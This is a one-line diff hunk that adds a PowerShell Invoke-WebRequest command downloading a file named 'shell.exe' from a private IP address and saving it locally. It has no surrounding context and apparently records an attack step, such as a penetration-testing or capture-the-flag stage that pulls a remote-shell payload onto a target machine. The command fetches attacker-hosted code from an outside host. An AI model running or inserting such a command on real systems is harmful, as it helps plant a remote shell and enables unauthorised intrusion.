@@ -1,0 +1,1 @@
+powershell Invoke-WebRequest -Uri http://10.13.15.55/shell.exe -Outfile shell.exe
